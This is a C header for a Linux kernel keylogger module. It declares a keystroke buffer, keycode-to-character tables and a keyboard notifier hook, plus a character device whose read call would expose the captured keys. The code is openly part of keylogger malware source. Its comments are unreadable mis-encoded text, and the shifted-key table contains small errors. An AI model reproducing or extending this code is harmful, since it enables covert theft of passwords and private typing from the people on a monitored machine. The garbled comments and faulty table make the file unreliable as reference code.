#ifndef KEY_LOGGER_H //KEY_LOGGER_H�� ���ǵ��� �ʾҴٸ� KEY_LOGGER_H�� �����Ѵ�. 
#define KEY_LOGGER_H

#include <linux/fs.h> //�������
#include <linux/types.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#define KLG_MAJOR   60 //��ó��
#define BUFF_LENGTH 1024
#define FIRST_CD    KEY_1 //'1'
#define LAST_CD     KEY_SLASH //'/'

char buffer[BUFF_LENGTH+1]; //���� �迭 ����
char* bptr = buffer; //���� �迭�� ���� �ּҸ� bptr������ �����Ѵ�.
const char* endptr = (buffer+sizeof(buffer)-1); //���� �迭�� ������ �ּҸ� endptr�� �����Ѵ�.
const char ch_table[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r', //const�� �̿��Ͽ� �迭�� ���� ���ȭ��Ŵ.
		   '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
		   'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
		   'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'};

const char shifted_ch_table[] = { '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '\r', //const�� �̿��Ͽ� �迭�� ���� ���ȭ��Ŵ.
		   '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '{', '}', '\n',
		   'X', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ':', '|', 'X',
		   'X', '\\', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', '<', '>', '?'};

inline char get_ascii(int code) { //inline�Լ��� �����Ͻ� ġȯ�ϴ� �ƽ�Ű�ڵ尪�� ��� �Լ� ����
	if((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X'; //���࿡ ���� ���� ���ڶ�� X�� ��ȯ
	else if(code == KEY_SPACE) return ' '; //�����̽���� ������ ��ȯ
	
	return ch_table[(code-FIRST_CD)]; //�ش� ���ڸ� ��ȯ
}
inline char shifted_get_ascii(int code) { //inline�Լ��� �����Ͻ� ġȯ�ϴ� �ƽ�Ű�ڵ尪�� ��� �Լ� ����
	if ((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X'; //���࿡ ���� ���� ���ڶ�� X�� ��ȯ
	else if (code == KEY_SPACE) return ' '; //�����̽���� ������ ��ȯ

	return shifted_ch_table[(code - FIRST_CD)]; //�ش� ���ڸ� ��ȯ
}
int klg_open(struct inode *inode, struct file *filp); //klg_open �Լ� ����
ssize_t klg_read(struct file *filp, char *buf, size_t count, loff_t *f_pos); //klg_read�Լ� ����
void klg_exit(void); //klg_exit�Լ� ����
int klg_init(void); //klg_init�Լ� ����
int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* param); //kbd_notifier�Լ� ����

struct file_operations klg_fops = { //�Լ����� �����ϴ� ����ü
  .owner = THIS_MODULE,             //read, open�� ���� klg_read, klg_open�Լ��� �����
  .read = klg_read,
  .open = klg_open
};

struct notifier_block nb = {
  .notifier_call = kbd_notifier //notifielr_call�� ���� kbd_notifier �Լ��� �����
};

#endif
